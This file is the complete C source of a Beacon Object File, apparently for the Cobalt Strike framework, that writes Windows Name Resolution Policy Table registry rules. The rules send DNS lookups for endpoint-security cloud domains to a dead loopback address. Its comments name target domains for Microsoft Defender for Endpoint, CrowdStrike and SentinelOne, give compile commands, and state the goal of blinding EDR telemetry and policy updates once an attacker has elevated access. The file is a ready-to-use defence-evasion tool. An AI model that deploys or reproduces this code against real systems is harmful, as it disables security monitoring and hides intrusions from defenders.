/*
 * nrpt_sinkhole.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Block EDR cloud DNS resolution by injecting sinkhole rules into the Windows
 * Name Resolution Policy Table (NRPT). Affected domains resolve to 127.0.0.2
 * where nothing is listening, causing all DNS lookups to return SERVFAIL.
 *
 * WHY THIS WORKS (NRPT layer)
 * ---------------------------
 * The Windows DNS Client service (svchost.exe hosting the dnscache service)
 * processes DNS queries in user space before forwarding to the system resolver.
 * Its lookup order is:
 *
 *   1. hosts file         (C:\Windows\System32\drivers\etc\hosts)
 *   2. DNS cache          (in-process cache in dnscache service)
 *   3. NRPT rules         ← WE INJECT HERE
 *   4. System DNS servers (from network adapter config)
 *
 * NRPT rules are read from:
 *   HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\<name>
 *
 * Each subkey is one rule. The DNS Client evaluates the namespace pattern
 * against every outgoing query BEFORE forwarding to the real DNS server.
 * When our rule matches, it redirects the query to our chosen DNS server
 * (127.0.0.2 — loopback address with nothing listening).
 * Result: query times out or immediately fails with SERVFAIL.
 *
 * KEY REGISTRY VALUES PER RULE
 * ----------------------------
 *   Name          REG_MULTI_SZ  namespace pattern, e.g. "*.security.microsoft.com\0\0"
 *                               Wildcard '*' matches any label prefix.
 *   Version       REG_DWORD     must be 2
 *   ConfigOptions REG_DWORD     8 = GenericDNSServer (use the DNSServers value)
 *   DNSServers    REG_SZ        "127.0.0.2" — loopback, nothing listening
 *
 * EFFECT ON EDR
 * -------------
 * EDR agents that rely on DNS to find their cloud backend will be completely
 * blinded. Without DNS, TLS handshake cannot begin, telemetry cannot be
 * uploaded, and policy updates cannot be received.
 *
 * Microsoft Defender for Endpoint domains: *.endpoint.microsoft.com,
 *   *.wdcp.microsoft.com, *.ods.opinsights.azure.com
 * CrowdStrike domains: *.cloudsink.net, *.falcon.crowdstrike.com
 * SentinelOne domains: *.sentinelone.net, *.pax.sentinelone.net
 *
 * MODES
 * -----
 *   0 — ADD: install sinkhole NRPT rules for given domain patterns
 *            (semicolon-separated, e.g. "*.security.microsoft.com;*.wdcp.microsoft.com")
 *   1 — REMOVE: delete all "edrchoker_" prefixed subkeys under DnsPolicyConfig
 *
 * COMPILATION
 * -----------
 *   mingw64:  x86_64-w64-mingw32-gcc -o nrpt_sinkhole.x64.o -c nrpt_sinkhole.bof.c -masm=intel
 *   MSVC:     cl /c /TC /GS- /Fonrpt_sinkhole.x64.obj nrpt_sinkhole.bof.c
 *
 * beacon.h: https://github.com/trustedsec/CS-Situational-Awareness-BOF
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────────
 * BOFs resolve DLL functions at runtime via the DLL$Function naming convention.
 * The BOF loader patches call sites before execution.                         */
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD, LPWSTR,
                                                         DWORD, REGSAM, LPSECURITY_ATTRIBUTES,
                                                         PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD,
                                                        const BYTE*, DWORD);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD,
                                                       LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegDeleteKeyW(HKEY, LPCWSTR);
DECLSPEC_IMPORT BOOL    WINAPI DNSAPI$DnsFlushResolverCache(void);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT void*   WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* ─── Registry base path ─────────────────────────────────────────────────── */
static const wchar_t g_BaseKeyPath[] =
    L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\DnsPolicyConfig";

/* ─── Key name prefix ────────────────────────────────────────────────────── */
static const wchar_t g_KeyPrefix[] = L"edrchoker_";

/* ─── Sinkhole DNS server ────────────────────────────────────────────────── */
static const wchar_t g_SinkServer[] = L"127.0.0.2";

/* ═══════════════════════════════════════════════════════════════════════════
 * HELPER FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Inline wchar_t tokenizer — no CRT wcstok needed.
 * Splits on ';'. Modifies buffer in-place.                                   */
static wchar_t* WNextTok(wchar_t** cursor) {
    wchar_t* start = *cursor;
    if (!start || *start == L'\0') return NULL;
    while (*start == L';') start++;
    if (*start == L'\0') { *cursor = start; return NULL; }
    wchar_t* p = start;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *cursor = p + 1; }
    else            { *cursor = p; }
    return start;
}

/* Append src into dst starting at position pos.
 * Returns updated pos. Never writes past dst[max-1].                        */
static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

/* Convert DWORD to 8-character uppercase hex string into out[0..8].
 * No CRT required — uses a literal hex table.
 * Example: HexU32(out, 0xA3F2B819) → out = L"A3F2B819"                     */
static void HexU32(wchar_t* out, DWORD v) {
    static const wchar_t hex[] = L"0123456789ABCDEF";
    out[0] = hex[(v >> 28) & 0xF];
    out[1] = hex[(v >> 24) & 0xF];
    out[2] = hex[(v >> 20) & 0xF];
    out[3] = hex[(v >> 16) & 0xF];
    out[4] = hex[(v >> 12) & 0xF];
    out[5] = hex[(v >>  8) & 0xF];
    out[6] = hex[(v >>  4) & 0xF];
    out[7] = hex[(v >>  0) & 0xF];
    out[8] = L'\0';
}

/* Case-insensitive prefix check without CRT.
 * Returns TRUE if str starts with prefix.                                   */
static BOOL WStartsWith(const wchar_t* str, const wchar_t* prefix) {
    while (*prefix) {
        wchar_t sc = *str, pc = *prefix;
        if (sc >= L'A' && sc <= L'Z') sc += 32;
        if (pc >= L'A' && pc <= L'Z') pc += 32;
        if (!sc || sc != pc) return FALSE;
        str++; prefix++;
    }
    return TRUE;
}

/* wchar_t string length without CRT.                                        */
static int WLen(const wchar_t* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NRPT RULE INSTALL
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * WriteNRPTRule — create one NRPT subkey for a single domain pattern.
 *
 * Registry layout created:
 *   HKLM\...\DnsPolicyConfig\edrchoker_XXXXXXXX\
 *       Name          REG_MULTI_SZ   "<domain>\0\0"
 *       Version       REG_DWORD      2
 *       ConfigOptions REG_DWORD      8  (GenericDNSServer)
 *       DNSServers    REG_SZ         "127.0.0.2"
 *
 * REG_MULTI_SZ note:
 *   A MULTI_SZ is a sequence of null-terminated wchar_t strings terminated
 *   by an extra null. For one string "*.foo.com" the buffer is:
 *     L"*.foo.com\0\0"
 *   The byte count passed to RegSetValueExW MUST include both null terminators.
 *
 * Unique subkey name:
 *   edrchoker_ + GetTickCount() hex. Multiple calls within the same tick
 *   are disambiguated by passing different tick values from the caller.
 *
 * Returns TRUE on success.
 */
static BOOL WriteNRPTRule(HKEY hBase, const wchar_t* domain,
                           DWORD tick, wchar_t* keyNameOut, int keyNameMax) {
    /* Build subkey name: edrchoker_XXXXXXXX */
    wchar_t hexStr[9];
    HexU32(hexStr, tick);

    int p = 0;
    p = WAppend(keyNameOut, p, keyNameMax, g_KeyPrefix);
    p = WAppend(keyNameOut, p, keyNameMax, hexStr);
    keyNameOut[p] = L'\0';

    HKEY hRule = NULL;
    DWORD disp = 0;
    LONG rc = ADVAPI32$RegCreateKeyExW(
        hBase, keyNameOut, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL,
        &hRule, &disp);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] RegCreateKeyExW('%S') failed: %ld\n", keyNameOut, rc);
        return FALSE;
    }

    BOOL ok = TRUE;
    DWORD dw;

    /* Name: REG_MULTI_SZ — domain + double null terminator.
     * Build wchar_t buffer on stack. Domain + L'\0' + L'\0'.
     * cbData = (domainLen + 2) * sizeof(wchar_t)                            */
    wchar_t mszBuf[512];
    int dlen = WLen(domain);
    if (dlen > 508) dlen = 508;
    KERNEL32$RtlMoveMemory(mszBuf, domain, dlen * sizeof(wchar_t));
    mszBuf[dlen]   = L'\0';
    mszBuf[dlen+1] = L'\0';
    DWORD mszBytes = (DWORD)((dlen + 2) * sizeof(wchar_t));

    rc = ADVAPI32$RegSetValueExW(hRule, L"Name", 0, REG_MULTI_SZ,
                                  (const BYTE*)mszBuf, mszBytes);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "      RegSetValueExW(Name) failed: %ld\n", rc);
        ok = FALSE; goto cleanup;
    }

    /* Version: REG_DWORD 2 */
    dw = 2;
    rc = ADVAPI32$RegSetValueExW(hRule, L"Version", 0, REG_DWORD,
                                  (const BYTE*)&dw, sizeof(DWORD));
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "      RegSetValueExW(Version) failed: %ld\n", rc);
        ok = FALSE; goto cleanup;
    }

    /* ConfigOptions: REG_DWORD 8 = NRPT_CONFIG_GENERIC_DNS_SERVER */
    dw = 8;
    rc = ADVAPI32$RegSetValueExW(hRule, L"ConfigOptions", 0, REG_DWORD,
                                  (const BYTE*)&dw, sizeof(DWORD));
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "      RegSetValueExW(ConfigOptions) failed: %ld\n", rc);
        ok = FALSE; goto cleanup;
    }

    /* DNSServers: REG_SZ "127.0.0.2"
     * cbData includes the null terminator.                                  */
    rc = ADVAPI32$RegSetValueExW(hRule, L"DNSServers", 0, REG_SZ,
                                  (const BYTE*)g_SinkServer,
                                  (DWORD)((WLen(g_SinkServer) + 1) * sizeof(wchar_t)));
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "      RegSetValueExW(DNSServers) failed: %ld\n", rc);
        ok = FALSE; goto cleanup;
    }

cleanup:
    ADVAPI32$RegCloseKey(hRule);
    return ok;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NRPT RULE REMOVE
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * RemoveNRPTRules — enumerate DnsPolicyConfig, delete all "edrchoker_" keys.
 *
 * Index shifting note:
 *   RegEnumKeyExW is index-based. When a key at index N is deleted, the key
 *   that was at N+1 moves to N. Therefore we ONLY increment the index when
 *   we SKIP a key (don't delete it). When we delete, we leave the index
 *   unchanged so we examine the same slot again (now occupied by the next key).
 *
 * Returns count of deleted keys.
 */
static int RemoveNRPTRules(HKEY hBase) {
    int removed = 0;
    DWORD idx = 0;

    for (;;) {
        wchar_t keyName[256];
        DWORD   keyNameLen = 256;
        LONG rc = ADVAPI32$RegEnumKeyExW(
            hBase, idx, keyName, &keyNameLen,
            NULL, NULL, NULL, NULL);

        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] RegEnumKeyExW(idx=%lu) failed: %ld\n", idx, rc);
            break;
        }

        if (WStartsWith(keyName, g_KeyPrefix)) {
            rc = ADVAPI32$RegDeleteKeyW(hBase, keyName);
            if (rc == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] Deleted NRPT rule: '%S'\n", keyName);
                removed++;
                /* Do NOT increment idx — key at this slot is now the next one */
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [-] RegDeleteKeyW('%S') failed: %ld\n", keyName, rc);
                idx++; /* Skip this key so we don't loop forever on error */
            }
        } else {
            idx++; /* Not our key — advance to next */
        }
    }

    return removed;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iZ", mode, domains)):
 *
 *   [int32] mode
 *     0 = add sinkhole rules for each domain in the semicolon-separated list
 *     1 = remove all edrchoker_ NRPT keys
 *
 *   [wchar_t* Z] domains
 *     Semicolon-separated domain patterns, e.g.:
 *     "*.security.microsoft.com;*.wdcp.microsoft.com"
 *     Empty string allowed for mode 1.
 *
 * Privilege requirement: HKLM write → must be running as SYSTEM or
 * Administrator with elevated token (UAC bypass if needed).
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG     mode    = BeaconDataInt(&parser);
    int      argBytes = 0;
    wchar_t* rawArg  = (wchar_t*)BeaconDataExtract(&parser, &argBytes);

    /* Copy arg to mutable stack buffer */
    wchar_t buf[2048];
    int i;
    for (i = 0; i < 2047; i++) buf[i] = L'\0';
    if (rawArg && argBytes > 2) {
        int n = argBytes / (int)sizeof(wchar_t);
        if (n >= 2048) n = 2047;
        KERNEL32$RtlMoveMemory(buf, rawArg, n * sizeof(wchar_t));
        buf[n] = L'\0';
    }

    /* Open (or create) the DnsPolicyConfig base key */
    HKEY hBase = NULL;
    DWORD disp = 0;
    LONG rc = ADVAPI32$RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, g_BaseKeyPath,
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_READ | KEY_WRITE | KEY_ENUMERATE_SUB_KEYS,
        NULL, &hBase, &disp);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Cannot open/create DnsPolicyConfig registry key: %ld\n"
            "    Ensure elevated privileges and HKLM write access.\n", rc);
        return;
    }

    /* ── MODE 0: ADD SINKHOLE RULES ─────────────────────────────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] No domain list provided.\n"
                "    Usage: nrpt_sinkhole *.foo.com;*.bar.com\n");
            ADVAPI32$RegCloseKey(hBase);
            return;
        }

        /* Count domains */
        wchar_t countBuf[2048];
        KERNEL32$RtlMoveMemory(countBuf, buf, sizeof(wchar_t) * 2047);
        countBuf[2047] = L'\0';
        int total = 0;
        wchar_t* cc = countBuf;
        while (WNextTok(&cc) != NULL) total++;

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] NRPT Sinkhole: blocking DNS for %d domain(s)...\n", total);

        int ok = 0;
        DWORD tickBase = KERNEL32$GetTickCount();
        wchar_t workBuf[2048];
        KERNEL32$RtlMoveMemory(workBuf, buf, sizeof(wchar_t) * 2047);
        workBuf[2047] = L'\0';
        wchar_t* cursor = workBuf;
        wchar_t* tok;
        int seq = 0;

        while ((tok = WNextTok(&cursor)) != NULL) {
            /* Increment tick by seq so each rule gets a unique key name even
             * if multiple calls happen within the same GetTickCount tick.   */
            DWORD tick = tickBase + (DWORD)seq;
            seq++;

            wchar_t keyName[64];
            if (WriteNRPTRule(hBase, tok, tick, keyName, 64)) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] Rule '%S' -> '%S'\n"
                    "      DNS queries redirect to 127.0.0.2 (no server = SERVFAIL)\n",
                    keyName, tok);
                ok++;
            }
        }

        /* Flush DNS resolver cache so rules take effect immediately.
         * Without this, cached answers may persist for their TTL.           */
        BOOL flushed = DNSAPI$DnsFlushResolverCache();
        if (flushed)
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] DNS cache flushed — rules active immediately\n");
        else
            BeaconPrintf(CALLBACK_ERROR,
                "[!] DnsFlushResolverCache() failed — rules will activate on next TTL expiry\n");

        BeaconPrintf(ok == total ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "[*] RESULT: %d/%d sinkhole rules installed\n"
            "    EDR cannot resolve its C2 domains\n",
            ok, total);

    /* ── MODE 1: REMOVE ALL edrchoker_ NRPT RULES ───────────────────────── */
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] NRPT Sinkhole: removing all edrchoker_ rules...\n");

        int removed = RemoveNRPTRules(hBase);

        BOOL flushed = DNSAPI$DnsFlushResolverCache();
        if (flushed)
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] DNS cache flushed\n");

        BeaconPrintf(removed > 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "[*] RESULT: %d rule(s) removed\n"
            "    %s\n",
            removed,
            removed > 0 ? "EDR DNS resolution restored" :
                          "No edrchoker_ rules found (already removed?)");
    }

    ADVAPI32$RegCloseKey(hBase);
}
